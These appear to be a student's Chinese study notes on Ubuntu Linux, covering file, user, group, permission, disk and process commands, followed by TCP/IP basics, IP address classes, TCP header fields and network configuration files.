&#x2F;&#x2F;查找文件名中以vim开头的所有文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>locate 查找符合条件的文件</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">locate cpuinfo &#x2F;&#x2F;查找含有cpuinfo的文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>grep 查找包含指定关键字的文件</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">grep -ir &quot;Ubuntu&quot; &#x2F;user | less &#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol></li><li><p>其他管理命令</p><ul><li><p><strong>ln 创建连接文件</strong></p><blockquote><ul><li><p style="color:blue;">ln [参数] [目的地址] [链接文件名]</p></li></ul></blockquote><p><font color="blue">两种链接：硬链接和软连接：</font></p><ul><li><strong>硬链接利用每个文件分配的物理编号inode建立的，因此不能跨越文件系统。修改硬链接的目标文件名，链接依然有效；</strong></li></ul></li></ul></li></ol><ul><li><strong>软连接利用文件路径名建立链接，通常为绝对路径，增加可移植性。修改软链接目标文件名，链接将断开</strong> <img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230210002324999.png" alt="image-20230210002324999" style="zoom:67%;" /></li><li><strong>wc 统计文件的字数、字节数、行数等信息</strong></li></ul>  <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">   wc -c 字节wc -l 行数   wc -w 字数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre><code> &lt;img src=&quot;https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212191405117.png&quot; alt=&quot;image-20230212191405117&quot; style=&quot;zoom:67%;&quot; /&gt;</code></pre><ul><li><strong>comm 逐行比较两个<font color="blue">已排序</font>文件的差异，并显示</strong></li><li><strong>diff 逐行比较文本文件的异同处</strong>逐行比较文本文件的异同处。指定比较目录，会比较相同文件名的文件，不会比较子目录</li></ul><h4 id="P105-Ubuntu用户系统概述"><a href="#P105-Ubuntu用户系统概述" class="headerlink" title="P105: Ubuntu用户系统概述"></a>P105: Ubuntu用户系统概述</h4><p>Ubuntu Linux系统是一个<font color="red">多用户、多任务的分时</font>操作系统</p><p><font color=Brown>Ubuntu用户类型:  3个</font></p><ul><li><font color=Brown>初次创建的用户：完成比普通用户多的功能</font></li><li><font color=Brown>root用户 #：系统管理员，完成对系统的所有管理功能，拥有最高权限</font></li><li><font color=Brown>普通用户 ~：在安装完操作系统后，被创建的其他所有用户</font></li></ul><p>查看各个用户的相关信息：<strong>配置文件/etc/passwd</strong></p><p><strong>记录当前操作系统中所有用户的基本信息：用户名、用户UID、用户组ID(GID)、主目录路径、登录Shell等。</strong></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230210004522336.png" alt="image-20230210004522336" style="zoom:67%;" /><h4 id="P113-用户管理命令"><a href="#P113-用户管理命令" class="headerlink" title="P113: 用户管理命令"></a>P113: 用户管理命令</h4><p>sudo和su的配置文件 /etc/sudoers</p><ol><li><p><font color=Brown><strong>添加用户 adduser</strong></font></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># adduser abc &#x2F;&#x2F;添加一个名为abc的普通用户# adduser --system --home &#x2F;home&#x2F;xyz --shell &#x2F;bin&#x2F;bash xyz &#x2F;&#x2F;添加一个名为xyx的系统用户，指定主目录为&#x2F;home&#x2F;xyz，默认shell为bash(ls &#x2F;home -&gt; abc xyz)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><font color=Brown><strong>显示用户信息  finger</strong></font></p><p>finger命令用于查找用户，并显示对应用户的相关信息</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># sudo apt install fingerfinger -l abc  &#x2F;&#x2F;列出用户abc的详细信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>更改用户密码 passwd</p><p>passwd命令用于更改用户密码。如果当前用户为普通用户，只更改自己密码；当前用户为超级管理员，能更改所有用户密码</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">passwd abc &#x2F;&#x2F;更改用户abc的密码passwd -d abc &#x2F;&#x2F;删除用户abc的密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><font color=Brown><strong>修改用户登录信息 usermode</strong></font></p><p>usermode命令用于修改已添加到系统中的某个用户的登录名、主目录、默认shell等与登录相关的信息</p><pre class="line-numbers language-none"><code class="language-none">usermode -l abcd abc &#x2F;&#x2F;将用户abc改名为abcdfinger abc &#x2F;&#x2F;查找登录名为abc的用户，不存在<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><font color=Brown><strong>显示用户ID id</strong></font></p><p>id命令用于显示系统中某个用户的UID、GID等识别号信号。</p><pre class="line-numbers language-none"><code class="language-none">id root &#x2F;&#x2F;显示用户root的所有IDid -u abc &#x2F;&#x2F;显示用户abc的UID-g 组ID  -G 所有组ID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>修改用户个人信息 chfn</p><p>chfn命令用于修改用户的基本个人信息，如真实姓名、电话号码等。</p><pre class="line-numbers language-none"><code class="language-none">chfn -f abcdefg abc &#x2F;&#x2F;将用户abc的真实姓名改为abcdefgchfn -h 1111111 abc &#x2F;&#x2F;设置用户abc的电话号码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><font color=Brown><strong>删除用户 deluser</strong></font></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">deluser --remove-all-files abc &#x2F;&#x2F;删除用户abc以及一切相关文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h4 id="P117-组管理命令"><a href="#P117-组管理命令" class="headerlink" title="P117: 组管理命令"></a>P117: 组管理命令</h4><p>cat /etc/passwd 看用户信息；cat /etc/group 看组相关信息</p><ol><li><p><strong>添加用户组 addgroup</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">addgroup abc &#x2F;&#x2F;添加一个普通用户组addgroup --system abc &#x2F;&#x2F;添加一个系统用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>显示组内用户 groups</p><p>groups命令用于显示某个组里包含的用户</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">groups root &#x2F;&#x2F;显示用户组root内的用户groups abc &#x2F;&#x2F;显示用户组abc内的用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>修改用户组信息 groupmod</strong></p><p>groupmod命令用于更改用户组的名称、ID等信息。</p><pre class="line-numbers language-none"><code class="language-none">groupmod -g 1002 abc &#x2F;&#x2F;更改用户组abc的GID为1002groupmod -n abcd abc &#x2F;&#x2F;更改用户组abc名称为abccat &#x2F;etc&#x2F;group | grep abc &#x2F;&#x2F;查看配置文件中abc信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>删除用户组 delgroup</strong></p><pre class="line-numbers language-none"><code class="language-none">delgroup abc &#x2F;&#x2F;删除用户组abc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h4 id="P118-权限管理"><a href="#P118-权限管理" class="headerlink" title="P118: 权限管理"></a>P118: 权限管理</h4><p>Ubuntu在管理自己的用户和文件时，都是依靠权限体系来提高安全性。</p><p>权限是指某一个用户或用户组能够使用系统资源的限制情况。root管理员拥有系统的最高权限；初次创建的用户拥有管理员的部分权限；其他普通用户的权限最低。</p><p><font color=Brown>对于文件，有读r、写w、修改x(可执行权限)三种权限。(二进制表示：100, 010, 001 ; <strong>八进制表示：4, 2, 1 -&gt; r+w+x=7，故7为最高权限</strong>)</font></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230210225153846.png" alt="image-20230210225153846" style="zoom:50%;" /><ul><li>“drwxr-xr-x”表明了权限与用户组的关系，除第1位表示<strong>文件类型</strong>，剩余9位以3位为一组，分别表示<strong>文件归属用户的权限 u</strong>、归属用户组的权限 g、其他用户的权限 o。</li><li>“26”表示链接数</li><li>”bd bd”表示文件拥有者和该用户所归属的用户组</li></ul><pre class="line-numbers language-none"><code class="language-none">bd的3类用户和对应权限情况：它的拥有者是bd用户，对应权限是“rwx&quot;，对该文件具有读写修改的权限与bd用户同组的其他用户，对应权限是&quot;r-x&quot;，对该文件具有读和修改的权限其他用户，对应权限是&quot;r-x&quot;，对该文件具有读和修改的权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>权限字母表示法：</strong></p><table><thead><tr><th>字母</th><th>含义</th></tr></thead><tbody><tr><td>r, w, x 表示权限</td><td>可读，可写，可执行权限</td></tr><tr><td>a, u, g, o 表示文件归属关系</td><td>所有用户，归属用户，归属组，其他用户</td></tr><tr><td>=, +, - 表示权限变化</td><td>具备权限，添加某权限，去除某权限</td></tr></tbody></table><pre class="line-numbers language-none"><code class="language-none">例子：a+x：对所有用户添加可执行权限go-x：对归属组和其他用户去除原有可执行权限u&#x3D;rxw：对归属用户具备可读、可写、可执行权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong><font color=Brown>常用权限管理命令：</font></strong></p><p>利用shell命令，可以方便地查看文件和文件夹的权限，也可以方便地对权限作出修改，还可以对文件所属用户及群组进行修改</p><ul><li><p><strong>chmod 修改文件或文件夹的权限</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">字母表示法：chmod a+w a.cpp &#x2F;&#x2F;对a.cpp文件的所有用户增加可写权限数字表示法：chmod 777 test &#x2F;&#x2F;修改目录test的权限为777，即所有用户都拥有可读、可写、可执行权限-R实现对目录下的文件权限的递归修改：chmod -cR 755 test&#x2F; &#x2F;&#x2F;将test目录下所有文件权限改为755，包括目录本身，使用-c参数显示修改结果<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>chown修改文件或目录的归属用户或归属组</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">chown abc a.cpp &#x2F;&#x2F;修改a.cpp文件的归属用户为abcchown -c abc.abc a.cpp &#x2F;&#x2F;同时改变a.cpp文件的归属用户和用户组chown -v .abc a.cpp &#x2F;&#x2F;改变a.cpp文件的归属用户组迭代：chown -cR abc test &#x2F;&#x2F;修改目录中所有文件的归属<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>chgrp专门修改文件或目录的归属组</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">chgrp -c abc a.cpp &#x2F;&#x2F;修改文件的归属组为abcchgrp -cR abc test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><h4 id="P127-磁盘概述"><a href="#P127-磁盘概述" class="headerlink" title="P127: 磁盘概述"></a>P127: 磁盘概述</h4><p>配置文件/etc/fstab 查看磁盘分区的情况及别名</p><p>没有实际的硬盘。<font color=Brown><strong>主分区/主挂载点的别名是/dev/sda1</strong>，即“/”挂载点</font>。/dev/sda5表示逻辑分区，虚拟设备：<font color=Brown><strong>/dev/scd0光驱</strong></font>，<font color=Brown><strong>/dev/fd0软驱</strong></font>。SWAP<font color=Brown><strong>交换分区被挂载至/root/swapfile</strong></font></p><p>/dev/后面部分表示一个具体的分区，hd表示IDE硬盘，sd表示SATA硬盘或其他外部设备，had中的第3位a表示这是该类型接口上的第1个设备。每一个IDE接口可以允许有两个设备，一个是主设备，另一个为从设备，可以分别用hda、hdb表示第1个IDE接口上的两个设备。</p><p><font color=Brown><strong>/dev/hda1~/dev/hda4都表示主分区</strong></font>，<font color=Brown><strong>/dev/hda5表示该硬盘上的第1个逻辑分区</strong></font>，分区的顺序是不能随意修改。</p><h4 id="P128-磁盘管理方法"><a href="#P128-磁盘管理方法" class="headerlink" title="P128: 磁盘管理方法"></a>P128: 磁盘管理方法</h4><ul><li><p><strong>fdisk 磁盘分区</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">fdisk &#x2F;dev&#x2F;hda &#x2F;&#x2F;对IDE硬盘进行分区fdisk -l &#x2F;&#x2F;列出当前操作系统<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>mkfs</strong> 在分区上<strong>建立文件系统</strong>或格式化指定形式</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">mkfs -v &#x2F;&#x2F;显示命令使用方法mkfs -V &#x2F;&#x2F;显示版本信息mkfs -t ext3 &#x2F;dev&#x2F;sda3 &#x2F;&#x2F;将&#x2F;dev&#x2F;sda3的文件系统建立为ext3类型<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>mkswap 设置交换分区</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">mkswap -c -vl &#x2F;dev&#x2F;sda5 102400 &#x2F;&#x2F;在&#x2F;dev&#x2F;sda5建立大小为100MB的交换分区，建立前先检查是否有损坏的区块<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>df 显示磁盘信息</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">df -a &#x2F;&#x2F;显示所有的磁盘信息-l 仅显示本地的文件系统信息 -i 显示索引节点信息df -t ext3 &#x2F;&#x2F;显示系统中ext3类型的分区信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>du 显示目录的容量</strong></p><pre class="line-numbers language-none"><code class="language-none">du -a &#x2F;root &#x2F;&#x2F;显示&#x2F;root目录下每个文件的大小，以K为单位<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="P193-195-进程管理"><a href="#P193-195-进程管理" class="headerlink" title="P193-195: 进程管理"></a>P193-195: 进程管理</h4><p><font color=Brown><strong>什么是进程？什么是程序？进程有什么特点？父子进程的关系？</strong></font></p><p><strong><font color=Brown>进程的3种类型，基本信息(PID,PPID…)，3种基本状态(state,wait,running)</font></strong></p><p><strong>1.进程的概念：</strong></p><p>Ubuntu Linux 的所有任务都是在操作系统内核的调度下由CPU执行，很多时候，Linux是将任务和进程的慨念合在一起。<strong>进程的标准定义: 进程是可开发执行的程序在一个数据集合上的运行过程。</strong>进程是一个动态的使用系统资源，处于活动状态的应用程序。<strong>进程和程序有着显著的区别。</strong></p><ul><li>程序是静态概念，本身可以作为一种资源长期保存在磁盘上;进程是一个程序的执行过程,是动态概念,有一定的生命周期，如果进程一旦执行结束，就不再存在于操作系统中</li><li>进程是一个能独立运行的单位，能与其他进程并发执行，它是操作系统中资源申请调度的最小单位;而程序不能作为一个独立运行的单位，它也不占用CPU 资源</li><li>程序并不是和进程一一对应的 一个程序可以由多个进程共用,一个进程也可以在活动中有顺序地执行多个程序</li></ul><p>在Ubuntu Linux中，init进程是所有进程的发起者和控制者，每个进程都有一个编号<strong>PID</strong>，是进程在当前系统中运行的顺序。<strong>Init用于终结父进程</strong>，如果该进程出现了问题，操作系统会崩溃。</p><p>因为init进程在系统运行期间始终不会消亡或停止，所以系统总是可以确信它的存在，并在必要的时候以此为参照。因此，<strong>系统调用fork()函数来创建一个新进程</strong>，并且作为init的子进程，从而最终形成系统中运行的所有其他进程。</p><p>为了标识和管理进程，使用PCB进程控制块来进行此项重要工作。进程有以下几个主要参数：</p><ul><li><font color=Brown>PID</font>：进程号，唯一标识进程（父进程为1）        Process ID</li><li><font color=Brown>PPID</font>：父进程号，创建某个进程的上一个进程号      Parent PID</li><li>USER：启动某个进程的用户ID(UID)和该用户归属的组ID(GID)       </li><li>STAT：进程状态。一个进程可能处于多种状态，包括运行状态、等待状态（可被中断或不可被中断）、停止状态、睡眠状态和僵死状态等</li><li>PRIORITY：优先级</li><li>资源占用：占用系统资源</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">- ps aux  &#x2F;&#x2F;查看当前所有运行着的进程信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong><font color=Brown>Ubuntu Linux进程的3种类型：</font></strong></p><ul><li>交互进程：由Shell启动的进程</li><li>批处理进程：与终端联系不大，在等待队列中按序执行</li><li>守护进程：后台运行的进程，一般总是活动状态</li></ul><p>2.<font color=Brown><strong>进程的运行状态</strong></font></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212115553914.png" alt="image-20230212115553914" style="zoom:67%;" /><ul><li>等待状态wait：该状态有两种模式，一种是可被中断的，另一种不可被中断。这种状态下的进程处于等待系统分配给它资源，如果一旦得到资源，将转入就绪状态。</li><li>就绪状态running：这种状态的进程当前没有运行,但所有申请的资源已经具备。只要内核对其进行调度，将立即拥有CPU的控制权，开始运行。</li><li>僵死状态zombie：也称僵尸状态或僵尸进程。这种状态下的进程已经运行完毕，执行了相应的任务，已经不再存在，但它的父进程留下了一个记录，包括一个退出码和一些时间信息等。</li><li>停止状态stop：正在运行的进程由于某些原因的影响而退出，将进入停止状态，例遇到更高优先级的进程占用了CPU资源。</li><li>中断状态interupt</li></ul><blockquote><p>进程状态60</p></blockquote><p>3.进程管理操作</p><ul><li><p><strong>ps 查看系统进程信息（静态信息）</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">-f:产生某个进程的一个完整信息清单。-a:显示所有用户的进程清单。-u:产生某个特定用户的进程清单。-x:显示后台运行进程。ps &#x2F;&#x2F;显示与控制终端相关进程的基本信息ps -u abc -f &#x2F;&#x2F;显示abc用户所有完整信息ps aux &#x2F;&#x2F;显示系统中的所有进程信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>top 动态显示运行中的进程详细信息</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">top -d 3 &#x2F;&#x2F;每3秒动态更新进程信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>nice 设置进程运行优先级</strong></p><p>每个进程都有一个优先级参数，表示占有CPU资源的等级，优先级越高进程更容易获取CPU控制权。进程优先级一般为-20~19，-20为最高优先级。修改进程nice值，可以修改进程优先级。系统进程默认的优先级是0。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nice -5 process &#x2F;&#x2F;优先级置为5。若没有指定默认置为10nice --12 process &#x2F;&#x2F;优先级置为-12<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong><font  color="blue">renice 修改进程的优先级</font></strong></p><p>可调范围-20~19</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo renice 12 7716 &#x2F;&#x2F;修改PID7716的进程的优先级为12sudo renice 6 -u abc &#x2F;&#x2F;修改abc用户所有进程优先级为6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>kill 终止进程命令</p><p>一般情况，可以通过停止一个进程的方法来正常结束该进程。但在某种情况下，进程没有响应，可使用kill命令停止某个活动。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">kill -STOP 4385 &#x2F;&#x2F;停止4385进程，但不退出kill -CONT 4385 &#x2F;&#x2F;重新开始4385进程kill -9 4385 &#x2F;&#x2F;强制终止4385进程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>killall 终止所有同名进程</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">killall -9 process &#x2F;&#x2F;终止系统中所有名为process的进程<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="P200-临时工作安排at"><a href="#P200-临时工作安排at" class="headerlink" title="P200: 临时工作安排at"></a>P200: 临时工作安排at</h4><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212141653461.png" alt="image-20230212141653461" style="zoom: 50%;" /><ol><li><p>服务启动</p><p>at命令用来安排完成临时性工作，即只需要执行一次的系统任务。使用该命令，需要提前启动一个进程，即启动一个服务。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo &#x2F;etc&#x2F;init.d&#x2F;atd restart  &#x2F;&#x2F;重新启动at服务<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>使用at命令</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo at 23:50 2009-12-15 &#x2F;&#x2F;在2009-12-15的23：50执行以下命令<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>维护当前系统中的at服务</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo atq &#x2F;&#x2F;查询当前系统中的所有at进程sudo atrm 1 &#x2F;&#x2F;删除1号工作任务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><p><strong>周期性工作安排cron</strong></p><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps1.jpg" alt="img" style="zoom:67%;" /> </center>#### P211: TCP/IP基础<p>（尽可能写全面）</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221016160838763.png" alt="image-20221016160838763" style="zoom:80%;" /><ul><li><p><strong>网络接口层</strong>（Network Interface Physical)：模型的基层，负责数据帧的发送和接收（帧Frame是独立的网络信息传输单元)。网络接口层将帧格式的数据放到网络上，或从网上把帧取下来。</p></li><li><p><strong>互联层（Internet）</strong>：互联协议将数据包封装成Internet 数掂包（IP packet)，并运行必要的路由算法。这里有4种互联协议。</p><ul><li><strong>网际协议(IP)</strong>:负责在主机和网络之间路径寻址和路由数据包。</li><li><strong>地址解析协议（ARP)</strong>:获取同一物理网络中的硬件主机地址。</li><li><strong>因特网控制消息协议（(ICMP)</strong>:发送消息，并报告有关数据包的传送错误。</li><li><strong>互联组管理协议（IGMP)</strong>:实现本地多路广播路由器报告。</li></ul></li><li><p><strong>传输层</strong>:传输协议在主机之间提供通信会话。传输协议的选择根据数据传输方式而定。主要有以下两个传输协议。</p><ul><li>传输控制协议(<strong>TCP</strong>)：为应用程序提供<strong>可靠的</strong>通信连接。适合于一次传输<strong>大批数据</strong>的情况，并适用于要求得到响应的应用程序。</li><li>用户数据包协议（<strong>UDP</strong>）:提供了无连接通信，且不对传送包进行可靠性确认。适合于一次传输<strong>小量数据</strong>可靠性则由应用层确认。</li></ul></li><li><p><strong>应用层</strong>:应用程序通过这一层访问网络，主要包括常见的FTP、HTTP、DNS和 TELNET等协议。</p><ul><li><strong>Telnet</strong>:提供远程登录(终端仿真）服务。</li><li><strong>FTP</strong>:提供应用级的文件传送协议。,</li><li><strong>SMTP</strong>:简单邮件传送协议。</li><li><strong>SNMP</strong>:简单网络管理协议，使用传输层UDP 协议。</li><li><strong>DNS</strong>:域名解析服务，也就是将域名映像成IP地址的协议，使用传输层UDP协议。</li><li><strong>HTTP</strong>:超文本传输协议，访问Web所用的协议。</li></ul></li></ul><p>TCP/IP协议簇体系结构及各层协议结构如图。 在网络接口层，最重要的信息之一是主机的MAC地址，为48bit，在物理上唯一标识某台主机；IP层的IP地址在逻辑上唯一标识某台主机；在主机内部，传输层的端口对应唯一的应用服务。</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212134419401.png" alt="image-20230212134419401" style="zoom:67%;" /><h4 id="P212-IP地址表示形式及分类"><a href="#P212-IP地址表示形式及分类" class="headerlink" title="P212: IP地址表示形式及分类"></a>P212: IP地址表示形式及分类</h4><p>1.表示形式：</p><ul><li><p>二进制表示法</p></li><li><p>点分十进制表示法</p><p>IP地址由网络号和主机号组成，程度为4字节</p><ul><li>网络号：标识一个物理的网络，同一个网络上的所有主机使用同一个网络号，该号在互联网中是唯一的。</li><li>主机号：确定网络中的一个工作端、服务器、路由器或者其他TCP/IP 主机。对于同一个网络号来说，主机号是唯一的。每个TCP/IP主机由一个逻辑IP地址确定网络号和主机号。</li></ul></li></ul><p>2.IP地址分类</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212135517579.png" alt="image-20230212135517579" style="zoom:50%;" /><ul><li><strong>A类地址</strong>: 可以拥有最大数量的主机，最高位为0，紧跟的7位表示网络号，其余24位表示主机号，总共允许有 126个网络。</li><li><strong>B类地址</strong>: 被分配到中等规模和大规候的网络中，最高两位总被置为二进制的10，前16位为网络号，后16位 为主机号，允许有16384个网络。</li><li><strong>C类地址</strong>：高3为被置为二进制的110，前 24位为网络号，后8位为主机号，允许有大约200万个网络。</li><li>D类地址:被用于多路广播组用户，高4位总被置为1110,余下的位用于标明客户机所属的组。</li><li>E类地址是一种仅供试验的地址。</li></ul><p>几条准则：</p><ul><li>网络号不能为127。该标识号被保留作为回路及诊断功能。</li><li>不能将网络号和主机号的各位均置为1。如果每位都是1,该地址会被解释为网内广播而不是一个主机号</li><li>各位均不能置0，否则该地址被解释为“就是本网络”。</li><li>对于本网络来说，主机号应核唯一，否则会出现IP地址已分配或有冲突的错</li></ul><p><strong>网络划分标准</strong></p><h4 id="P217-TCP包头"><a href="#P217-TCP包头" class="headerlink" title="P217: TCP包头"></a>P217: TCP包头</h4><p>cat /usr/include/linux/tcp.h</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212221150069.png" alt="image-20230212221150069" style="zoom: 67%;" /><ol><li>源端口和目标端口(Source Port&amp;Destinaton Port):传送/接收数据使用的端口。</li><li>数据包序号(Sequence Number)：数据包过大而进行分段后，记录数据包序号，接收方可以组合成功</li><li>回应序号 (Acknowledge Number):为了确认接收端收到发送端所送出的数据包数据,发送端希望能吸收到接收端的响应。</li><li><strong>数据补偿（Data Offset):补偿位。</strong></li><li>保留位（Reserved ):未使用的保留字段。</li><li>控制标志码（Control Flag):当进行网络连接时，必须说明这个联机的状态，使接收端了解这个数据包的主要动作。这个子段为6bits，分别代表6个句柄，若为1则为启动。说明如下所示。<ul><li> URG （Urgent)）: 为1表示该数据包为紧急数据包，接收端应该紧急处理。</li><li>ACK (Acknowledge):为1表示这个数据包为确认数据包，与Acknowledge Number有关</li><li>PSH (Push function):为1表示要求对方立即传送缓冲区内的其他对应数据包，而无须等待缓冲区满。</li><li>RST （Reset):为1表示联机会马上结束，而无须等待终止确认手续。这是个强制结束的联机,且发送端已断线。</li><li>SYN (Svnchronous):为1表示发送端希望双方建立同步处理，即要求建立联机。通常带有SYN标志的数据包表示“主动”要连接到对方的意思。</li></ul></li><li><strong>滑动窗口</strong>（Window):用于控制数据包的流量，可以告知对方目前有多少缓冲区容量(Receive Buffer)可以接收数据包。当Window=0时，表示缓冲器已经额满。</li><li><strong>确认校验码</strong>（Checksum);数据由发送端送出前会进行一个检验的动作，并将该动作的检验值标注在这个字段上。而接收者收到这个数据包之后，会再次对数据包进行验证，并且与原来发送的确认校验码值进行对比,如果相符就接收，若不符就认为该数据包已经损毁，要求对方</li><li><strong>紧急信息</strong> （Urgent Pointer ):该字段在 Code字段内的URG值为1时才会产生作用，告知紧急数据所在的位置。</li><li>任意资料（Options）</li></ol><h4 id="P220-ARP-RARP概念"><a href="#P220-ARP-RARP概念" class="headerlink" title="P220: ARP/RARP概念"></a>P220: ARP/RARP概念</h4><p>任何一台主机（确切的说是任何一个网络适配器）在物理上唯一的标识是48bit适配器的地址，即MAC地址 ( Media Access Controladdress)。这个地址保存在网络适配器的ROM中，是不能修改的。在实际应用中,田户可 以为任意一个网络适配器指定不同的IP地址。</p><p>MAC地址是所有网络活动的基础,但是网上的主机之间的通信是通过IP地址讲行的,因此在这个过程中就存在一个转换，即MAC地址与IP地址的对应，实现这一地址解析的协议为ARP(地址解析协议）和RARP（逆地址解析协议）。</p><ul><li>ARP为IP地址到对应的硬件MAC 地址之间提供动态映射，这个过程是自动完成的,一般应用程序或系统管理员不必操作中间流程。</li><li>RARP用于那些没有磁盘驱动器的系统（一般是无盘工作站或X终端)，它需要系统管理员进行手工设置，提供MAC地址到IP地址的解析。</li></ul><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212221237222.png" alt="image-20230212221237222" style="zoom: 80%;" /><h4 id="P225-227-网络配置文件"><a href="#P225-227-网络配置文件" class="headerlink" title="P225-227: 网络配置文件"></a>P225-227: 网络配置文件</h4><p>Ubuntu Linux为适应不同需求，在进行网络访问时，需要配置网络配置文件，这些配置文件位于”/etc“目录下。</p><p><strong>1./etc/network/interfaces网络基本信息配置文件</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">cat &#x2F;etc&#x2F;network&#x2F;interfaces&#x2F;&#x2F;lo接口的配置信息1 auto lo &#x2F;&#x2F;系统开机时，自动启动lo接口2 iface lo inet loopback &#x2F;&#x2F;设置lo接口的地址信息，此处设置为本地回环(loopback)3&#x2F;&#x2F;系统中一块网卡eth0接口的配置信息&#x2F;&#x2F;一个网卡对应一个地址的基本配置方法：4 auto eth0 &#x2F;&#x2F;系统开机时，自动启动eth0接口，该接口为系统默认的第一块网卡所在的接口5 iface eth0 inet dhcp &#x2F;&#x2F;设置eth0接口的地址信息，此处设置为动态自动获取(dhcp)6 address 192.168.1.21 &#x2F;&#x2F;设置eth0接口的一个静态IP地址为192.168.1.217 netmask 255.255.255.0 &#x2F;&#x2F;设置eth0接口的子网掩码为255.255.255.08 gateway 192.168.1.1 &#x2F;&#x2F;设置eth0接口的静态网关地址为192.168.1.1&#x2F;&#x2F;同一个物理网卡设备上有多个地址的基本配置方法：11 auto eth0 eth0:112 iface eth0 inet static13 address 192.168.1.10014 netmask 255.255.255.015 gateway 192.168.1.1 16 iface eth0:1 inet static17 address 192.168.1.20018 netmask 255.255.255.019 gateway 192.168.1.1 